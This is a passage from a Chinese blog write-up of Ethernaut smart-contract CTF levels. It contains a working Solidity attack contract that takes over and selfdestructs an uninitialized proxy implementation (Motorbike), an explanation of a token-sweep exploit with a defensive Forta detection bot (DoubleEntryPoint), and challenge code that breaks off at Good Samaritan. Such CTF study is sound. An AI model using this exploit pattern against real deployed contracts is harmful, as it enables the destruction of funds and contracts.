class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件：</strong>将<code>Engine</code>进行销毁。</p><p>虽然<code>Engine</code>合约中没有调用<code>selfdestruct</code>函数的逻辑，但是该合约继承了<code>Initializable</code>，表明其具有更新的能力，为了更新<code>Engine</code>合约，使其具有<code>selfdestruct</code>函数的逻辑，我们要调用<code>upgradeToAndCall</code>，该函数会先调用<code>_authorizeUpgrade</code>，即对发起者进行判断是不是<code>upgrader</code>，后者的值可以在<code>initialize</code>中修改,前提是<code>Engine</code>没有被“完全”初始化，即<code>Engine</code>中的<code>initialized</code>为1.可是其真的为1了吗？</p><p>通过简单的审计，我们可以得出结论<code>Motorbike</code>是代理合约，<code>Engine</code>是逻辑合约，后者继承了<code>Initializable</code>合约，根据题目给的<code>Initializable</code>合约链接，我们可以知道<code>Initializable</code>中有两个布尔型变量，因此<code>Engine</code>的slot 0 布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------</span><br><span class="line">unused(10)|upgrader(20)|initializing(1)|initialized(1)| &lt;- slot0</span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure><p>此外，<code>Motorbike</code>合约将逻辑合约地址写入到了一个标准位置，即<code>_IMPLEMENTATION_SLOT</code>。</p><p>我们可以先看看该合约中的内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slot = <span class="string">'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance,slot)</span><br><span class="line"><span class="string">'0x00000000000000000000000099fd7881e8df22fbfc339184c2b7aa55bd803aa6'</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">'0x09c53d4a08a1b840fa4401e5219bdd91557c74a9'</span>,<span class="number">0</span>)</span><br><span class="line"><span class="string">'0x0000000000000000000000000000000000000000000000000000000000000000'</span></span><br></pre></td></tr></table></figure><p>我们可以看得到，实际上<code>initializing</code>和<code>initialized</code>都是<code>false</code>。也就是说我们是可以调用<code>initialize()</code>来将<code>upgrader</code>修改为我们的地址，然后再调用<code>upgradeToAndCall</code>，修改新地址为我们部署的合约，<code>data</code>设置为调用<code>selfdestruct()</code>，因此攻击合约如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line">contract MotorbikeAttack &#123;</span><br><span class="line">	address public engin_addr ;</span><br><span class="line">	</span><br><span class="line">	constructor(address _engin_addr)public&#123;</span><br><span class="line">		engin_addr &#x3D; _engin_addr;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function attack() public&#123;</span><br><span class="line">        &#x2F;&#x2F; 先调用 initialize() ，将Engine中的upgrader设置为本合约地址</span><br><span class="line">		_setupgrader();</span><br><span class="line">        &#x2F;&#x2F; 部署一个含有 selfdestruct 逻辑的合约</span><br><span class="line">		ContractWithDestruct ct &#x3D; new ContractWithDestruct();</span><br><span class="line">        &#x2F;&#x2F; 由于在 Engine 中，会通过delegatecall的方式调用data</span><br><span class="line">		&#x2F;&#x2F; 因此实际上是 Engine 会执行</span><br><span class="line">		(bool success, ) &#x3D; engin_addr.call(</span><br><span class="line">			abi.encodeWithSignature(&quot;upgradeToAndCall(address,bytes)&quot;,</span><br><span class="line">			address(ct),abi.encodeWithSignature(&quot;destruct()&quot;))</span><br><span class="line">		);</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function _setupgrader() internal &#123;</span><br><span class="line">		(bool success, ) &#x3D; engin_addr.call(</span><br><span class="line">			abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">		);</span><br><span class="line">		require(success);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract ContractWithDestruct&#123;</span><br><span class="line">	function destruct()external&#123;</span><br><span class="line">		selfdestruct(msg.sender);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>await web3.eth.getStorageAt(instance,slot)</code>获得的地址部署上述合约，然后调用<code>attack</code>函数即可完成攻击。</p><h2 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface DelegateERC20 &#123;</span><br><span class="line">  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Forta is IForta &#123;</span><br><span class="line">  mapping(address &#x3D;&gt; IDetectionBot) public usersDetectionBots;</span><br><span class="line">  mapping(address &#x3D;&gt; uint256) public botRaisedAlerts;</span><br><span class="line"></span><br><span class="line">  function setDetectionBot(address detectionBotAddress) external override &#123;</span><br><span class="line">      usersDetectionBots[msg.sender] &#x3D; IDetectionBot(detectionBotAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function notify(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">    if(address(usersDetectionBots[user]) &#x3D;&#x3D; address(0)) return;</span><br><span class="line">    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125; catch &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function raiseAlert(address user) external override &#123;</span><br><span class="line">      if(address(usersDetectionBots[user]) !&#x3D; msg.sender) return;</span><br><span class="line">      botRaisedAlerts[msg.sender] +&#x3D; 1;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CryptoVault &#123;</span><br><span class="line">    address public sweptTokensRecipient;</span><br><span class="line">    IERC20 public underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address recipient) &#123;</span><br><span class="line">        sweptTokensRecipient &#x3D; recipient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setUnderlying(address latestToken) public &#123;</span><br><span class="line">        require(address(underlying) &#x3D;&#x3D; address(0), &quot;Already set&quot;);</span><br><span class="line">        underlying &#x3D; IERC20(latestToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">    ...</span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    function sweepToken(IERC20 token) public &#123;</span><br><span class="line">        require(token !&#x3D; underlying, &quot;Can&#39;t transfer underlying token&quot;);</span><br><span class="line">        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;</span><br><span class="line">    DelegateERC20 public delegate;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;</span><br><span class="line">        delegate &#x3D; newContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">        if (address(delegate) &#x3D;&#x3D; address(0)) &#123;</span><br><span class="line">            return super.transfer(to, value);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;</span><br><span class="line">    address public cryptoVault;</span><br><span class="line">    address public player;</span><br><span class="line">    address public delegatedFrom;</span><br><span class="line">    Forta public forta;</span><br><span class="line"></span><br><span class="line">    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;</span><br><span class="line">        delegatedFrom &#x3D; legacyToken;</span><br><span class="line">        forta &#x3D; Forta(fortaAddress);</span><br><span class="line">        player &#x3D; playerAddress;</span><br><span class="line">        cryptoVault &#x3D; vaultAddress;</span><br><span class="line">        _mint(cryptoVault, 100 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyDelegateFrom() &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; delegatedFrom, &quot;Not legacy contract&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier fortaNotify() &#123;</span><br><span class="line">        address detectionBot &#x3D; address(forta.usersDetectionBots(player));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Cache old number of bot alerts</span><br><span class="line">        uint256 previousValue &#x3D; forta.botRaisedAlerts(detectionBot);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Notify Forta</span><br><span class="line">        forta.notify(player, msg.data);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Continue execution</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Check if alarms have been raised</span><br><span class="line">        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateTransfer(</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        address origSender</span><br><span class="line">    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">        _transfer(origSender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：部署一个异常检测机器人，监测合约并防止外部攻击者耗尽<code>CryptoVault</code>，使其耗尽不应耗尽的代币。</p><blockquote><p>本关卡参考自：<a href="http://www.snowywar.top/?p=3848" target="_blank" rel="noopener">http://www.snowywar.top/?p=3848</a></p></blockquote><p>根据描述,我们知道我们有两个代币,一个<code>legacytoken</code>,是一个被废弃的,还有一个是<code>DcoubleEntrypoint</code>,是取而代之的新货币,即它是<code>legacytoken</code>新版本</p><p>有个<code>CryptoVault</code>的金库.提供一个<code>sweeptoken</code>的方法,允许任何人向<code>swepttokensrecipient</code>sweep.</p><p>检查就是我们不能转移<code>Vault</code>的<code>underlying</code>代币，实际上该地址是<code>DoubleEntryPoint</code>地址。</p><p>部署时两种代币分别持有100,我们的目的是创建一个检测机器人,检测合约防止被外部攻击者耗尽<code>cryptovault</code>。</p><p>通过观察<code>LegacyToken</code>合约，我们不难发现，<code>delegate</code>就是<code>DoubleEntryPoint</code>的合约本身,意味着在<code>legacyToken</code>上执行转移时,本质是<code>DoubleEntryPoint.delegateTransfer</code></p><p>对于<code>LegacyToken</code>合约：</p><ul><li><code>onlyDelegateFrom</code>只允许<code>delegateFrom</code>调用这个函数。在此案例中，只有<code>LegacyToken</code>合约被允许调用这个函数，否则任何人都可以从<code>origSender</code>调用<code>_transfer</code>（即低级别的ERC20转账）。</li><li><code>fortaNotify</code>是一个特殊的函数修改器，触发一些特定的Forta逻辑，就像我们之前看到的那样</li></ul><p><code>_transfer</code>只检查<code>to</code>和<code>orSender</code>不是<code>address(0)</code>，以及<code>origSender</code>有足够的代币转账到<code>to</code>，但它不检查<code>orSender</code>是<code>msg.sender</code>或花费者有足够的授权。这就是为什么我们有<code>onlyDelegateFrom</code>修改器。</p><p>通过结合我们收集到的所有信息，你是否发现了我们可以利用的错误？回顾一下我们现有的知识：</p><ul><li><code>CryptoVault</code>的<code>underlying</code>代币是<code>DoubleEntryPoint</code>。合约提供了一个<code>sweepToken</code>来转账Vault中的代币，但它阻止了对<code>DoubleEntryPoint</code>代币的转移（因为它是<code>underlying</code>）。</li><li><code>DoubleEntryPoint</code>代币是一个ERC20代币，它实现了一个自定义的<code>delegateTransfer</code>函数，只能由<code>LegacyToken</code>代币调用，并由Forta通过执行<code>fortaNotify</code>函数修改器监控。该函数允许委托人将一定数量的代币从 <code>origSpender</code>转账到一个任意的接收者。</li><li><code>LegacyToken</code>是一个已经被 <code>废弃</code>的ERC20代币。当<code>transfer(address to, uint256 value)</code>函数被调用时，<code>DoubleEntryPoint</code>（该代币的 <code>新版本</code>）<code>delegate.delegateTransfer(to, value, msg.sender)</code>被调用。</li></ul><p>问题出在哪里？因为<code>LegacyToken.transfer</code>是<code>DoubleEntryPoint.transfer</code>的 <code>镜像</code>，这意味着当你要求转账1个<code>LegacyToken</code>时，实际上你在转账1个<code>DoubleEntryPoint</code>代币（要做到这一点，余额中必须有这两者）。</p><p><code>CryptoVault</code>包含100个两种代币，但 <code>sweepToken</code>只阻止了 底层 <code>DoubleEntryPoint</code> 的转账。</p><p>但是通过了解<code>LegacyToken</code>的工作原理，我们可以通过调用<code>CryptoVault.sweep(address(legacyTokenContract))</code>轻松抽取所有<code>DoubleEntryPoint</code>代币。</p><p>既然我们知道如何利用它，下一步就是阻止该过程。</p><p>当<code>DoubleEntryPoint.delegateTransfer()</code>被调用时候，由于<code>fortaNotify</code>修饰器，<code>IForta</code>中的<code>handleTransaction</code>最终先被调用。</p><p>为了进一步处理，我们先来了解一下<code>msg.data</code>是如何被函数传递：</p><ul><li><p>最初，<code>msg.data</code>被修饰器<code>fortaNotify()</code>收到，将包含以下函数签名：<code>function delegateTransfer(address to, uint256 value, address origSender)</code></p></li><li><p>然后将其发送到调用 <code>handleTransaction(user, msgData)</code> 函数的 <code>notify()</code>函数。这将更改我们的函数接收到的<code>msg.data</code></p></li><li><p>最终的 <code>msg.data</code> 将包含函数 <code>handleTransaction(address user, bytes calldata msgData) external</code> 的<code>msg.data</code>；在第二个参数字节中，<code>calldata msgData</code>将是 <code>delegateTransfer()</code> 函数的实际<code>msg.data</code>。这是我们为了获取 <code>origSender</code> 的值而需要访问的内容。</p></li></ul><p>下表显示了我们将开发的检测机器人看到的调用数据的排列。我们要关注的值是 <code>0xa8</code>位置上的 <code>origSender</code>:</p><table><thead><tr><th>偏移量</th><th>变量大小（字节）</th><th>类型</th><th>值</th></tr></thead><tbody><tr><td>0x00</td><td>4</td><td>bytes4</td><td><code>handleTransaction(address,bytes)</code>的选择器== <code>0x220ab6aa</code></td></tr><tr><td>0x04</td><td>32</td><td>address</td><td><code>user</code> 的地址</td></tr><tr><td>0x24</td><td>32</td><td>uint256</td><td><code>msgData</code>的偏移量</td></tr><tr><td>0x44</td><td>32</td><td>uint256</td><td><code>msgData</code>的长度</td></tr><tr><td>0x64</td><td>4</td><td>bytes4</td><td><code>delegateTransfer(address,uint256,address)</code> 的选择器== <code>0x9cd1a121</code></td></tr><tr><td>0x68</td><td>32</td><td>address</td><td><code>to</code> 的地址</td></tr><tr><td>0x88</td><td>32</td><td>uint256</td><td><code>value</code> 参数</td></tr><tr><td>0xA8</td><td>32</td><td>address</td><td><code>origSender</code> 参数 (<strong>我们需要关心的</strong>)</td></tr><tr><td>0xC8</td><td>28</td><td>bytes</td><td>根据编码字节的 32 字节参数规则进行零填充</td></tr></tbody></table><p>有了上面的分析后，我们就可以着手写我们的检测机器人的逻辑了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlertBot is IDetectionBot &#123;</span><br><span class="line">    address private cryptoVault;</span><br><span class="line"></span><br><span class="line">    constructor(address _cryptoVault) public &#123;</span><br><span class="line">        cryptoVault &#x3D; _cryptoVault;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line"></span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender :&#x3D; calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender &#x3D;&#x3D; cryptoVault) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署上述合约后，获得地址<code>0x38977718DC4ed97440060a7cC065FEadC43EF995</code>，修改合约中的机器人地址：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fortaAddress = <span class="keyword">await</span> contract.forta()</span><br><span class="line">detectionBotAddress = <span class="string">'38977718DC4ed97440060a7cC065FEadC43EF995'</span></span><br><span class="line">web3.utils.keccak256(<span class="string">'setDetectionBot(address)'</span>)</span><br><span class="line"><span class="string">'0x9e927c686457d61946f62ee085aea4bf59c36754253995951bb435ea8d75e9e3'</span></span><br><span class="line">selector = <span class="string">'0x9e927c68'</span></span><br><span class="line">param = web3.utils.padLeft(detectionBotAddress, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: fortaAddress, <span class="attr">data</span>: selector + param&#125;)</span><br></pre></td></tr></table></figure><h2 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;&#x3D;0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritan &#123;</span><br><span class="line">    Wallet public wallet;</span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        wallet &#x3D; new Wallet();</span><br><span class="line">        coin &#x3D; new Coin(address(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.setCoin(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestDonation() external returns(bool enoughBalance)&#123;</span><br><span class="line">        &#x2F;&#x2F; donate 10 coins to requester</span><br><span class="line">        try wallet.donate10(msg.sender) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (bytes memory err) &#123;</span><br><span class="line">            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) &#x3D;&#x3D; keccak256(err)) &#123;</span><br><span class="line">                &#x2F;&#x2F; send the coins left</span><br><span class="line">                wallet.transferRemainder(msg.sender);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error InsufficientBalance(uint256 current, uint256 required);</span><br><span class="line"></span><br><span class="line">    constructor(address wallet_) &#123;</span><br><span class="line">        &#x2F;&#x2F; one million coins for Good Samaritan initially</span><br><span class="line">        balances[wallet_] &#x3D; 10**6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address dest_, uint256 amount_) external &#123;</span><br><span class="line">        uint256 currentBalance &#x3D; balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; transfer only occurs if balance is enough</span><br><span class="line">        if(amount_ &lt;&#x3D; currentBalance) &#123;</span><br><span class="line">            balances[msg.sender] -&#x3D; amount_;</span><br><span class="line">            balances[dest_] +&#x3D; amount_;</span><br><span class="line"></span><br><span class="line">            if(dest_.isContract()) &#123;</span><br><span class="line">                &#x2F;&#x2F; notify contract </span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert InsufficientBalance(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    &#x2F;&#x2F; The owner of the wallet instance</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    error OnlyOwner();</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        if(msg.sender !&#x3D; owner) &#123;</span><br><span class="line">            revert OnlyOwner();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate10(address dest_) external onlyOwner &#123;</span><br><span class="line">        &#x2F;&#x2F; check balance left</span><br><span class="line">        if (coin.balances(address(this)) &lt; 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; donate 10 coins</span><br><span class="line">            coin.transfer(dest_, 10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferRemainder(address dest_) external onlyOwner &#123;</span><br><span class="line">        &#x2F;&#x2F; transfer balance left</span><br><span class="line">        coin.transfer(dest_, coin.balances(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCoin(Coin coin_) external onlyOwner 